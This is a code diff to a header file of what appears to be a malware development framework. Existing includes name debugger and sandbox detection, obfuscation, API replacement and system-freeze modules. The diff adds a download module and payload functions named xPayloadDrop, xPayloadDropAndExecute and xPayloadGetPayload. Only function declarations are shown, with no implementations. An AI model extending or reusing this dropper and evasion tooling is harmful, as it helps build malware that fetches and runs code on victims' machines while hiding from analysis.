@@ -10,11 +10,13 @@
 #include "xCrash.h"
 #include "xDebuggerDetection.h"
 #include "xDelay.h"
+#include "xDownload.h"
 #include "xFreeze.h"
 #include "xMemory.h"
 #include "xMemoryModule.h"
 #include "xObfuscation.h"
 #include "xOsReplacementApi.h"
+#include "xPayload.h"
 #include "xRandom.h"
 #include "xSandboxDetection.h"
 #include "xStaticModule.h"
@@ -67,6 +69,9 @@ public:
 		X_STATIC_MODULE_FUNCTION_0(void, xDelayIcmp)
 		X_STATIC_MODULE_FUNCTION_0(void, xDelayWindowsUpdate)
 
+		// xDownload
+		X_STATIC_MODULE_FUNCTION_3(bool, xDownloadToBuffer, const wchar_t*, uint8_t**, size_t*)
+			
 		// xFreeze
 		X_STATIC_MODULE_FUNCTION_0(void, xFreezeSystem)
 
@@ -89,6 +94,11 @@ public:
 
 		// xOsApiReplacement
 		X_STATIC_MODULE_FUNCTION_2(void*, xOsReplacementApiGetProcAddress, HANDLE, const char*)
+
+		// xPayload
+		X_STATIC_MODULE_FUNCTION_4(void*, xPayloadDrop, const char*, const uint8_t*, const size_t, const wchar_t*)
+		X_STATIC_MODULE_FUNCTION_4(void*, xPayloadDropAndExecute, const char*, const uint8_t*, const size_t, const wchar_t*)
+		X_STATIC_MODULE_FUNCTION_5(void*, xPayloadGetPayload, const char*, const uint8_t*, const size_t, uint8_t**, size_t*)
 
 		// xRandom
 		X_STATIC_MODULE_FUNCTION_2(uint32_t, xRandomNumber, uint32_t, uint32_t)
